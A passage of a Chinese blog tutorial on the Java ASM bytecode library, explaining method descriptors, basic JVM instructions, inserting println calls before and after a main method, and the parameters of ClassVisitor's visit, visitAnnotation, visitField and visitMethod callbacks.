<th align="center">Method declaration in source file</th>
<th align="center">Method descriptor</th>
</tr>
</thead>
<tbody><tr>
<td align="center">void m(int i, float f)</td>
<td align="center">(IF)V</td>
</tr>
<tr>
<td align="center">int m(Object o)</td>
<td align="center">(Ljava/lang/Object;)I</td>
</tr>
<tr>
<td align="center">int[] m(int i, String s)</td>
<td align="center">(ILjava/lang/String;)[I</td>
</tr>
<tr>
<td align="center">Object m(int[] i)</td>
<td align="center">([I]Ljava/lang/Object;</td>
</tr>
<tr>
<td align="center">String m()</td>
<td align="center">()Ljava/lang/String;</td>
</tr>
</tbody></table>
<h2 id="JVM指令"><a href="#JVM指令" class="headerlink" title="JVM指令"></a>JVM指令</h2><p>假设现在我们有如下一个类：</p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509154551909.png" alt="image-20200509154551909"></p>
<p>先用<code>javac com/yn/test/Test.java</code>编译得到<code>Test.class</code>文件，然后再使用<code>javap -c com/yn/test/Test</code>来查看下这个<code>Test.class</code>文件的字节码，结果如下图所示：</p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509154617771.png" alt="image-20200509154617771"></p>
<p>上图中第3行到第7行，是类<code>Test</code>的默认构造函数（由编译器默认生成），<code>Code</code>以下部分是构造函数内部代码，其中：</p>
<p><strong>aload_0</strong>：  这个指令是LOAD系列指令中的一个，它的意思表示装载当前第 0 个元素到堆栈中。代码上相当于<strong>this</strong>。而这个数据元素的类型是一个引用类型。这些指令包含了：ALOAD，ILOAD，LLOAD，FLOAD，DLOAD。区分它们的作用就是针对不用数据类型而准备的LOAD指令，此外还有专门负责处理数组的指令 SALOAD。</p>
<p><strong>invokespecial</strong>： 这个指令是调用系列指令中的一个。其目的是调用对象类的方法。后面需要给上父类的方法完整签名。“#1”的意思是 .class 文件常量表中第1个元素。值为：“java/lang/Object.”<init>“:()V”。结合ALOAD_0。这两个指令可以翻译为：“super()”。其含义是调用自己的父类构造方法。</init></p>
<p>第9到14行是<code>main</code>方法，<code>Code</code>以下是其字节码表示：</p>
<p><strong>getstatic</strong>：   这个指令是GET系列指令中的一个其作用是获取静态字段内容到堆栈中。这一系列指令包括了：GETFIELD、GETSTATIC。它们分别用于获取动态字段和静态字段。此处表示的意思获取静态成员<code>System.out</code>到堆栈中。</p>
<p><strong>ldc</strong>：这个指令的功能是从常量表中装载一个数据到堆栈中。此处表示从常量池中获取字符串”Hello World!”。</p>
<p><strong>invokevirtual</strong>：也是一种调用指令，这个指令区别与 invokespecial 的是它是根据引用调用对象类的方法。此处表示调用<code>java.io.PrintStream.println(String)</code>方法，结合前面的操作，这里调用的就是<code>System.out.println(&quot;Hello World!&quot;)</code>。</p>
<p><strong>return</strong>： 这也是一系列指令中的一个，其目的是方法调用完毕返回：可用的其他指令有：IRETURN，DRETURN，ARETURN等，用于表示不同类型参数的返回。</p>
<p>接下来，我们就可以根据上面所讲的内容，将代码字节码注入到<code>class</code>文件中了。</p>
<p>现在假设我们想要在类<code>Test</code>的<code>main</code>方法前后动态插入代码，如下所示：</p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509154949319.png" alt="image-20200509154949319"></p>
<p>要完成在<code>main</code>方法前后插入输出代码，需要以下几步操作：</p>
<p><strong>读取<code>Test.class</code>文件，可以通过 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 提供的<code>ClassReader</code>类进行<code>class</code>文件的读取与遍历。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用全限定名，创建一个ClassReader对象</span></span><br><span class="line">ClassReader classReader = <span class="keyword">new</span> ClassReader(<span class="string">"com.yn.test.Test"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建一个ClassWriter对象，并设置让系统自动计算栈和本地变量大小</span></span><br><span class="line">ClassWriter classWriter = <span class="keyword">new</span> ClassWriter(ClassWriter.COMPUTE_MAXS);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个自定义ClassVisitor，方便后续ClassReader的遍历通知</span></span><br><span class="line">ClassVisitor classVisitor = <span class="keyword">new</span> TestClassVisitor(classWriter);</span><br><span class="line"></span><br><span class="line"><span class="comment">//开始扫描class文件</span></span><br><span class="line">classReader.accept(classVisitor, ClassReader.SKIP_DEBUG);</span><br></pre></td></tr></table></figure>

<p>**构造<code>System.out.println(String)</code>的 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 代码。</p>
<p>上面我们从<code>javap</code>反编译得到的字节码可以知道，实现<code>System.out.println(&quot;Hello World!&quot;);</code>的字节码总共需要3步操作：<br> (1). 获取<code>System</code>静态成员<code>out</code>，其对应的指令为<code>getstatic</code>，对应的 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 代码为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mv.visitFieldInsn(Opcodes.GETSTATIC,</span><br><span class="line">                  Type.getInternalName(System.class), //"java/lang/System"</span><br><span class="line">                  <span class="string">"out"</span>,</span><br><span class="line">                  Type.getDescriptor(PrintStream.class) //"Ljava/io/PrintStream;"</span><br><span class="line">            );</span><br></pre></td></tr></table></figure>

<p> (2). 获取字符串常量”Hello World!”，其对应的指令为<code>ldc</code>，对应的 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 代码为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mv.visitLdcInsn(<span class="string">"Hello World!"</span>);</span><br></pre></td></tr></table></figure>

<p>(3). 获取<code>PrintStream.println(String)</code>方法，其对应的指令为<code>invokervirtual</code>，对应的 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 代码为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL,</span><br><span class="line">                   Type.getInternalName(PrintStream.class), //"java/io/PrintStream"</span><br><span class="line">                   <span class="string">"println"</span>,</span><br><span class="line">                   <span class="string">"(Ljava/lang/String;)V"</span>,<span class="comment">//方法描述符</span></span><br><span class="line">                   <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>

<p><strong>在<code>main</code>方法进入前，进行代码插入，可以通过<code>MethodVisitor.visitCode()</code>方法。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在源方法前去修改方法内容,这部分的修改将加载源方法的字节码之前</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      mv.visitCode();</span><br><span class="line">      System.out.println(<span class="string">"method start to insert code"</span>);</span><br><span class="line">      sop(<span class="string">"asm insert before"</span>);<span class="comment">//this is the insert code</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>在<code>main</code>方法退出前，进行代码插入，可以通关过<code>MethodVisitor.visitInsn()</code>方法，通过判断当前的指令为<code>return</code>时，表明即将执行<code>return</code>语句，此时插入字节码即可。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInsn</span><span class="params">(<span class="keyword">int</span> opcode)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//检测到return语句</span></span><br><span class="line">    <span class="keyword">if</span> (opcode == Opcodes.RETURN) &#123;</span><br><span class="line">        System.out.println(<span class="string">"method end to insert code"</span>);</span><br><span class="line">        sop(<span class="string">"asm insert after"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">//执行原本语句</span></span><br><span class="line">        mv.visitInsn(opcode);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><strong>字节码插入<code>class</code>文件成功后，导出字节码到原文件中。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取改写后的class二进制字节码</span></span><br><span class="line"><span class="keyword">byte</span>[] classFile = classWriter.toByteArray();</span><br><span class="line"><span class="comment">// 将这个类输出到原先的类文件目录下，这是原先的类文件已经被修改</span></span><br><span class="line">File file = <span class="keyword">new</span> File(<span class="string">"E:/code/Android/Projects/AsmButterknife/sample-java/build/classes/java/main/com/yn/test/Test.class"</span>);</span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">fos.write(classFile);</span><br><span class="line">fos.close();</span><br></pre></td></tr></table></figure>

<p><strong>注:</strong> <a href="http://search.maven.org/#search|ga|1|a%3A" target="_blank" rel="noopener" asm-commons"">asm-commons</a> 包中提供了一个类<code>AdviceAdapter</code>，使用该类可以更加方便的让我们在方法前后注入代码，因为其提供了方法<code>onMethodEnter()</code>和<code>onMethodExit()</code>。</p>
<p>通过上面介绍的内容，我们已经成功使用 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 动态注入字节码到<code>class</code>文件中。但是如果直接采用 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 代码注入字节码，还是相对困难的，幸运的是 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 给我们提供了 <a href="http://asm.ow2.org/doc/faq.html#Q10" target="_blank" rel="noopener">ASMifier</a> 工具，使得我们可以直接通过<code>.class</code>文件反编译为 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 代码。</p>
<p><a href="https://github.com/Why8n/AsmButterknife/blob/master/sample-java/src/main/java/com/yn/test/AsmTest.java" target="_blank" rel="noopener">完整代码</a></p>
<h1 id="ASM关键接口"><a href="#ASM关键接口" class="headerlink" title="ASM关键接口"></a>ASM关键接口</h1><h2 id="ClassVisitor"><a href="#ClassVisitor" class="headerlink" title="ClassVisitor"></a>ClassVisitor</h2><p>ClassVisitor，在 ASM3.0 中是一个接口，到了 ASM4.0 与 ClassAdapter 抽象类合并。主要负责 “拜访” 类成员信息。其中包括（标记在类上的注解，类的构造方法，类的字段，类的方法，静态代码块）,它的完整接口如下：</p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509160013663.png" alt="image-20200509160013663"></p>
<h3 id="visit-int-int-String-String-String-String"><a href="#visit-int-int-String-String-String-String" class="headerlink" title="visit(int , int , String , String , String , String[])"></a>visit(int , int , String , String , String , String[])</h3><p>该方法是当扫描类时第一个拜访的方法，主要用于类声明使用。下面是对方法中各个参数的示意：<strong>visit( 类版本 ,</strong> <strong>修饰符</strong> <strong>, 类名 , 泛型信息 , 继承的父类 , 实现的接口**</strong>)**。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">等价于：</span><br><span class="line">visit(V1_6, ACC_PUBLIC | ACC_SUPER , <span class="string">"org/more/test/asm/simple/TestBean"</span>,</span><br><span class="line">      <span class="keyword">null</span>, <span class="string">"java/lang/Object"</span>, <span class="keyword">null</span>)</span><br></pre></td></tr></table></figure>

<p><strong>第一个参数：</strong>表示类版本：V1_6，表示 “.class” 文件的版本是 JDK 1.6。可用的其他版本有：V1_1（JRE_1.1）、V1_2（J2SE_1.2）、V1_3（J2SE_1.3）、V1_4（J2SE_1.4）、V1_5（J2SE_1.5）、V1_6（JavaSE_1.6）、V1_7（JavaSE_1.7）。我们所指的 JDK 6 或 JDK 7 实际上就是只 JDK 1.6 或 JDK 1.7。</p>
<p><strong>第二个参数：</strong>表示类的修饰符：修饰符在 ASM 中是以 “ACC_” 开头的常量进行定义。可以作用到类级别上的修饰符有：ACC_PUBLIC（public）、ACC_PRIVATE（private）、ACC_PROTECTED（protected）、ACC_FINAL（final）、ACC_SUPER（extends）、ACC_INTERFACE（接口）、ACC_ABSTRACT（抽象类）、ACC_ANNOTATION（注解类型）、ACC_ENUM（枚举类型）、ACC_DEPRECATED（标记了@Deprecated注解的类）、ACC_SYNTHETIC。</p>
<p><strong>第三个参数：</strong>表示类的名称：通常我们的类完整类名使用 “org.test.mypackage.MyClass” 来表示，但是到了字节码中会以路径形式表示它们 “org/test/mypackage/MyClass” 值得注意的是虽然是路径表示法但是不需要写明类的 “.class” 扩展名。</p>
<p><strong>第四个参数：</strong>表示泛型信息，如果类并未定义任何泛型该参数为空。Java 字节码中表示泛型时分别对接口和类采取不同的定义。该参数的内容格式如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;泛型名:基于的类型....&gt;Ljava/lang/Object;</span><br><span class="line"></span><br><span class="line">&lt;泛型名::基于的接口....&gt;Ljava/lang/Object;</span><br></pre></td></tr></table></figure>

<p>其中 “泛型名:基于的类型” 内容可以无限的写下去，例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span>&lt;<span class="title">T</span>,<span class="title">V</span>,<span class="title">Z</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">泛型参数为：&lt;T:Ljava/lang/Object;V:Ljava/lang/Object;Z:Ljava/lang/Object;&gt;Ljava/lang/Object;</span><br><span class="line">分析结构如下：</span><br><span class="line">  &lt;</span><br><span class="line">   T:Ljava/lang/Object;</span><br><span class="line">   V:Ljava/lang/Object;</span><br><span class="line">   Z:Ljava/lang/Object;</span><br><span class="line">  &gt;</span><br><span class="line">   Ljava/lang/Object;</span><br></pre></td></tr></table></figure>

<p>再或者：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span>&lt;<span class="title">T</span> <span class="keyword">extends</span> <span class="title">Date</span>, <span class="title">V</span> <span class="keyword">extends</span> <span class="title">ArrayList</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">泛型参数为：&lt;T:Ljava/util/Date;V:Ljava/util/ArrayList;&gt;Ljava/lang/Object;</span><br><span class="line">分析结构如下：</span><br><span class="line">  &lt;</span><br><span class="line">   T:Ljava/util/Date;</span><br><span class="line">   V:Ljava/util/ArrayList;</span><br><span class="line">  &gt;</span><br><span class="line">   Ljava/lang/Object;</span><br></pre></td></tr></table></figure>

<p>以上内容只是针对泛型内容是基于某个具体类型的情况，如果泛型是基于接口而非类型则定义方式会有所不同，这一点需要注意。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span>&lt;<span class="title">T</span> <span class="keyword">extends</span> <span class="title">Serializable</span>, <span class="title">V</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">泛型参数为：&lt;T::Ljava/io/Serializable;V:Ljava/lang/Object;&gt;Ljava/lang/Object;</span><br><span class="line">分析结构如下：</span><br><span class="line">  &lt;</span><br><span class="line">   T::Ljava/io/Serializable; <span class="comment">//比类型多出一个“:”</span></span><br><span class="line">   V:Ljava/lang/Object;</span><br><span class="line">  &gt;</span><br><span class="line">   Ljava/lang/Object;</span><br></pre></td></tr></table></figure>

<p><strong>第五个参数：</strong>表示所继承的父类。由于 Java 的类是单根结构，即所有类都继承自 java.lang.Object 因此可以简单的理解为任何类都会具有一个父类。虽然在编写 Java 程序时我们没有去写 extends 关键字去明确继承的父类，但是 JDK在编译时 总会为我们加上 “ extends Object”。所以倘若某一天你看到这样一份代码也不要过于紧张。</p>
<p><strong>第六个参数：</strong>表示类实现的接口，在 Java 中类是可以实现多个不同的接口因此此处是一个数组例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> <span class="keyword">implements</span> <span class="title">Serializable</span> , <span class="title">List</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">该参数会以 “[java/io/Serializable, java/util/List]” 形式出现。</span><br></pre></td></tr></table></figure>

<p>这里需要补充一些内容，如果类型其本身就是接口类型。对于该方法而言，接口的父类类型是 “java/lang/Object”，接口所继承的所有接口都会出现在第六个参数中。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> inteface TestBean implements Serializable , List &#123;</span><br><span class="line"></span><br><span class="line">最后两个参数对应为:</span><br><span class="line">    <span class="string">"java/lang/Object"</span>, [<span class="string">"java/io/Serializable"</span>,<span class="string">"java/util/List"</span>]</span><br></pre></td></tr></table></figure>

<h3 id="visitAnnotation-String-boolean"><a href="#visitAnnotation-String-boolean" class="headerlink" title="visitAnnotation(String , boolean)"></a><strong>visitAnnotation(String , boolean)</strong></h3><p>该方法是当扫描器扫描到类注解声明时进行调用。下面是对方法中各个参数的示意：<strong>visitAnnotation(注解类型 , 注解是否可以在 JVM 中可见)</strong>。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span>(&#123; <span class="string">""</span> &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span>等价于：</span><br><span class="line">    visitAnnotation(<span class="string">"Lnet/hasor/core/gift/bean/Bean;"</span>, <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>

<p>下面是 @Bean 的源代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Target</span>(&#123; ElementType.TYPE &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Bean &#123;</span><br><span class="line">    <span class="comment">/** Bean名称。*/</span></span><br><span class="line">    <span class="keyword">public</span> String[] value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>第一个参数：</strong>表示的是，注解的类型。它使用的是（“L” + “类型路径” + “;”）形式表述。</p>
<p><strong>第二个参数：</strong>表示的是，该注解是否在 JVM 中可见。这个参数的具体含义可以理解为：如果为 true 表示虚拟机可见，我们可以通过下面这样的代码获取到注解类型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">testBeanType.getAnnotation(TestAnno<span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>谈到这里就需要额外说明一下在声明注解时常见的 “@Retention(RetentionPolicy.RUNTIME)” 标记。RetentionPolicy 是一个枚举它具备三个枚举元素其每个含义可以理解为：</p>
<ol>
<li>RetentionPolicy.SOURCE：声明注解只保留在 Java 源程序中，在编译 Java 类时注解信息不会被写入到 Class。如果使用的是这个配置 ASM 也将无法探测到这个注解。</li>
<li>RetentionPolicy.CLASS：声明注解仅保留在 Class 文件中，JVM 运行时并不会处理它，这意味着 ASM 可以在 visitAnnotation 时候探测到它，但是通过Class 反射无法获取到注解信息。</li>
<li>RetentionPolicy.RUNTIME：这是最常用的一种声明，ASM 可以探测到这个注解，同时 Java 反射也可以取得注解的信息。所有用到反射获取的注解都会用到这个配置，就是这个原因。</li>
</ol>
<h3 id="visitField-int-String-String-String-Object"><a href="#visitField-int-String-String-String-Object" class="headerlink" title="visitField(int , String , String , String , Object)"></a><strong>visitField(int , String , String , String , Object)</strong></h3><p>该方法是当扫描器扫描到类中字段时进行调用。下面是对方法中各个参数的示意：<strong>visitField(修饰符 , 字段名 , 字段类型 , 泛型描述 , 默认值)</strong>。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String stringData;</span><br><span class="line"></span><br><span class="line">stringData字段等价于：</span><br><span class="line">    visitField(ACC_PRIVATE, <span class="string">"stringData"</span>, <span class="string">"Ljava/lang/String;"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>)</span><br></pre></td></tr></table></figure>

<p><strong>第一个参数：</strong>表示字段的修饰符，修饰符在 ASM 中是以 “ACC_” 开头的常量进行定义。可以作用到字段级别上的修饰符有：ACC_PUBLIC（public）、ACC_PRIVATE（private）、ACC_PROTECTED（protected）、ACC_STATIC（static）、ACC_FINAL（final）、ACC_VOLATILE（volatile）、ACC_TRANSIENT（transient）、ACC_ENUM（枚举）、ACC_DEPRECATED（标记了@Deprecated注解的字段）、ACC_SYNTHETIC。</p>
<p><strong>第二个参数：</strong>表示字段的名称。</p>
<p><strong>第三个参数：</strong>表示字段的类型，其格式为：（“L” + 类型路径 + “;”）。</p>
<p><strong>第四个参数：</strong>表示泛型信息， 泛型类型描述是使用（“T” + 泛型名 + “;”）加以说明。例如：“private T data;” 字段的泛型描述将会是 “ TT; ”， “ private V data; ” 字段的泛型描述将会是 “ TV; ”。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span>&lt;<span class="title">T</span>, <span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> T data;</span><br><span class="line">    <span class="keyword">private</span> V value;</span><br><span class="line"></span><br><span class="line">等价于：</span><br><span class="line"></span><br><span class="line">visit(V1_6, ACC_PUBLIC | ACC_SUPER , <span class="string">"org/more/test/asm/simple/TestBean"</span>,</span><br><span class="line">      <span class="string">"&lt;T:Ljava/lang/Object;V:Ljava/lang/Object;&gt;Ljava/lang/Object;"</span>, <span class="comment">//定义了两个泛型类型 T 和 V</span></span><br><span class="line">      <span class="string">"java/lang/Object"</span>, <span class="keyword">null</span>)</span><br><span class="line"></span><br><span class="line">visitField(ACC_PRIVATE, <span class="string">"data"</span>, <span class="string">"Ljava/lang/Object;"</span>, <span class="string">"TT;"</span>, <span class="keyword">null</span>)  <span class="comment">//data 泛型名称为 T</span></span><br><span class="line">visitField(ACC_PRIVATE, <span class="string">"value"</span>, <span class="string">"Ljava/lang/Object;"</span>, <span class="string">"TV;"</span>, <span class="keyword">null</span>) <span class="comment">// value 泛型名称为 V</span></span><br></pre></td></tr></table></figure>

<p>还有一种情况，倘若类在定义泛型时候已经基于某个类型那么生成的代码将会是如下形式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span>&lt;<span class="title">T</span> <span class="keyword">extends</span> <span class="title">Serializable</span>, <span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> T data;</span><br><span class="line">    <span class="keyword">private</span> V value;</span><br><span class="line"></span><br><span class="line">等价于：</span><br><span class="line"></span><br><span class="line">visit(V1_6, ACC_PUBLIC | ACC_SUPER , <span class="string">"org/more/test/asm/simple/TestBean"</span>,</span><br><span class="line">      <span class="string">"&lt;T::Ljava/io/Serializable;V:Ljava/lang/Object;&gt;Ljava/lang/Object;"</span>, <span class="comment">//定义了两个泛型类型 T 和 V</span></span><br><span class="line">      <span class="string">"java/lang/Object"</span>, <span class="keyword">null</span>)</span><br><span class="line"></span><br><span class="line">visitField(ACC_PRIVATE, <span class="string">"data"</span>, <span class="string">"Ljava/io/Serializable;"</span>, <span class="string">"TT;"</span>, <span class="keyword">null</span>)  <span class="comment">//data 泛型名称为 T</span></span><br><span class="line">visitField(ACC_PRIVATE, <span class="string">"value"</span>, <span class="string">"Ljava/lang/Object;"</span>, <span class="string">"TV;"</span>, <span class="keyword">null</span>)     <span class="comment">// value 泛型名称为 V</span></span><br></pre></td></tr></table></figure>

<p><strong>第五个参数：</strong>表示的是默认值， 由于默认值是 Object 类型大家可能以为可以是任何类型。这里要澄清一下，默认值中只能用来表述 Java 基本类型这其中包括了（byte、sort、int、long、float、double、boolean、String）其他所有类型都不不可以进行表述。并且只有标有 “final” 修饰符的字段并且该字段赋有初值时这个参数才会有值。例如类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String data;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TestBean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        data = <span class="string">"aa"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>在执行 “visitField” 方法时候，这个参数的就是 null 值，下面这种代码也会是 null 值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Date data;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TestBean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        data =<span class="keyword">new</span> Date();</span><br><span class="line">    &#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>此外如果字段使用的是基本类型的包装类型，诸如：Integer、Long…也会为空值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Integer intData = <span class="number">12</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>能够正确得到默认值的代码应该是这个样子的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String data    = <span class="string">"ABC"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span>    intData = <span class="number">12</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="visitMethod-int-String-String-String-String"><a href="#visitMethod-int-String-String-String-String" class="headerlink" title="visitMethod(int , String , String , String , String[])"></a><strong>visitMethod(int , String , String , String , String[])</strong></h3><p>该方法是当扫描器扫描到类的方法时进行调用。下面是对方法中各个参数的示意：<strong>visitMethod(修饰符 , 方法名 , 方法签名 , 泛型信息 , 抛出的异常)</strong>。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">halloAop</span><span class="params">(String param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">等价于：</span><br><span class="line"></span><br><span class="line">visit(V1_6, ACC_PUBLIC | ACC_SUPER , <span class="string">"org/more/test/asm/simple/TestBean"</span>,</span><br><span class="line">      <span class="keyword">null</span>, <span class="string">"java/lang/Object"</span>, <span class="keyword">null</span>)</span><br><span class="line"></span><br><span class="line">visitMethod(ACC_PUBLIC, <span class="string">"&lt;init&gt;"</span>, <span class="string">"()V"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>)</span><br><span class="line">visitMethod(ACC_PUBLIC, <span class="string">"halloAop"</span>, <span class="string">"(Ljava/lang/String;)I"</span>, <span class="keyword">null</span>, [java/lang/Throwable])</span><br></pre></td></tr></table></figure>

<p><strong>第一个参数：</strong>表示方法的修饰符，修饰符在 ASM 中是以 “ACC_” 开头的常量进行定义。可以作用到方法级别上的修饰符有：ACC_PUBLIC（public）、ACC_PRIVATE（private）、ACC_PROTECTED（protected）、ACC_STATIC（static）、ACC_FINAL（final）、ACC_SYNCHRONIZED（同步的）、ACC_VARARGS（不定参数个数的方法）、ACC_NATIVE（native类型方法）、ACC_ABSTRACT（抽象的）、ACC_DEPRECATED（标记了@Deprecated注解的方法）、ACC_STRICT、ACC_SYNTHETIC。</p>
<p><strong>第二个参数：</strong>表示方法名，在 ASM 中 “visitMethod” 方法会处理（构造方法、静态代码块、私有方法、受保护的方法、共有方法、native类型方法）。在这些范畴中构造方法的方法名为 “<init>”，静态代码块的方法名为 “<clinit>”。列如：</clinit></init></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">halloAop</span><span class="params">(String param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">等价于：</span><br><span class="line"></span><br><span class="line">visit(V1_6, ACC_PUBLIC | ACC_SUPER , <span class="string">"org/more/test/asm/simple/TestBean"</span>,</span><br><span class="line">      <span class="keyword">null</span>, <span class="string">"java/lang/Object"</span>, <span class="keyword">null</span>)</span><br><span class="line"></span><br><span class="line">visitMethod(ACC_PUBLIC, <span class="string">"&lt;clinit&gt;"</span>, <span class="string">"()V"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>)</span><br><span class="line">visitMethod(ACC_PUBLIC, <span class="string">"&lt;init&gt;"</span>, <span class="string">"()V"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>)</span><br><span class="line">visitMethod(ACC_PUBLIC, <span class="string">"halloAop"</span>, <span class="string">"(Ljava/lang/String;)I"</span>, <span class="keyword">null</span>, [java/lang/Throwable])</span><br></pre></td></tr></table></figure>

<p><strong>第三个参数：</strong>表示方法签名，方法签名的格式如下：“(参数列表)返回值类型”。在字节码中不同的类型都有其对应的代码，如下所示：</p>
